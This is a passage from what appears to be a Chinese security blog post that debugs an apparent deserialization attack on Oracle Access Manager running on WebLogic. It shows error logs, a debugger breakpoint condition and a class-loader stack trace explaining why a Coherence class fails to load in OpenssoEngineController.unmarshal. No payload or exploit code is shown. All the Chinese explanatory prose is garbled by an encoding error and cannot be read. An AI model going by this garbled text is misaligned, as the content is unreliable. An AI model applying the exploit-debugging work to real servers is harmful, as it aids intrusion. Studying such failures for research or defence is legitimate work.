</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.execute(ExecuteThread.java:420)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.run(ExecuteThread.java:360)</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>SUPP_ATTRS =</span> <span style=color:#e6db74>{severity-value=8,</span> <span style=color:#a6e22e>rid=</span><span style=color:#e6db74>0,</span> <span style=color:#a6e22e>partition-id=</span><span style=color:#e6db74>0,</span> <span style=color:#a6e22e>partition-name=</span><span style=color:#e6db74>DOMAIN}</span> <span style=color:#a6e22e>SERVER =</span> <span style=color:#e6db74>oam_server1</span> <span style=color:#a6e22e>TIMESTAMP =</span> <span style=color:#e6db74>1657798361730</span> <span style=color:#a6e22e>USERID =</span> <span style=color:#e6db74>&lt;WLS</span> <span style=color:#960050;background-color:#1e0010>Kernel</span><span style=color:#f92672>&gt;</span> MACHINE = dfc3a0c6eea8 MSGID = BEA-101017 DATE = Jul 14, 2022 11:32:41,730 AM UTC SUBSYSTEM = HTTP CONTEXTID = 3c3067f6-a549-49e6-9215-202b032cf4e1-0000014f TXID =  THREAD = [ACTIVE] ExecuteThread: &#39;20&#39; for queue: &#39;weblogic.kernel.Default (self-tuning)&#39; SEVERITY = Error  
</span></span><span style=display:flex><span>WatchAlarmType: AutomaticReset 
</span></span><span style=display:flex><span>WatchAlarmResetPeriod: 30000 
</span></span><span style=display:flex><span>&gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;Jul</span> <span style=color:#960050;background-color:#1e0010>14,</span> <span style=color:#960050;background-color:#1e0010>2022</span> <span style=color:#960050;background-color:#1e0010>11:32:41,866</span> <span style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;Emergency&gt;</span> <span style=color:#f92672>&lt;oracle.dfw.incident&gt;</span> <span style=color:#f92672>&lt;BEA-000000&gt;</span> <span style=color:#f92672>&lt;incident</span> <span style=color:#960050;background-color:#1e0010>32</span> <span style=color:#960050;background-color:#1e0010>created</span> <span style=color:#960050;background-color:#1e0010>with</span> <span style=color:#960050;background-color:#1e0010>problem</span> <span style=color:#960050;background-color:#1e0010>key</span> <span style=color:#960050;background-color:#1e0010>&#34;DFW-99998</span> <span style=color:#960050;background-color:#1e0010>[java.lang.ClassNotFoundException][oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal][oam_server]&#34;</span><span style=color:#f92672>&gt;</span> 
</span></span></code></pre></td></tr></table></div></div><p>æ˜¯ç”± <code>ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable</code> å¼•èµ·çš„ <code>NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable</code> ã€‚</p><p>é€šè¿‡ä¸‹æ¡ä»¶å¼‚å¸¸æ–­ç‚¹å¿«é€Ÿå¤ç°</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-74-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-74-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>detailMessage</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;internal.util.invoke.Remotable&#34;</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714185615887.png alt=image-20220714185615887></p><p>å¯ä»¥çœ‹åˆ°æ˜¯åœ¨å°è¯•defineclassçš„æ—¶å€™å°è¯•ç”¨ <code>weblogic.utils.classloaders.GenericClassLoader</code> å»åŠ è½½ <code>com.tangosol.internal.util.invoke.Remotable</code> ï¼Œä½†æ²¡æœ‰æ‰¾åˆ°ã€‚</p><p><img loading=lazy src=image-20220714185851405.png alt=image-20220714185851405></p><p>æœç´¢ç±»åŠ è½½å™¨ç¡®å®ä¹Ÿæ²¡æœ‰</p><p><img loading=lazy src=image-20220714190616935.png alt=image-20220714190616935></p><p>æŠ¥é”™å®Œæ•´è°ƒç”¨æ ˆ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-67>67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-68>68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-69>69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-70>70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-71>71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-72>72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-73>73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-74>74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-75>75</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-76><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-76>76</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-77><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-77>77</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-78><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-78>78</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-79><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-79>79</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-80><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-80>80</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-81><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-81>81</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-82><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-82>82</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-83><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-83>83</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-84><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-84>84</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-85><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-85>85</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>findLocalClass:<span style=color:#ae81ff>1029</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>findClass:<span style=color:#ae81ff>990</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFindClass:<span style=color:#ae81ff>611</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>543</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>496</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>473</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doParentDelegate:<span style=color:#ae81ff>584</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>526</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>496</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>71</span><span style=color:#f92672>,</span> ChangeAwareClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>405</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>351</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
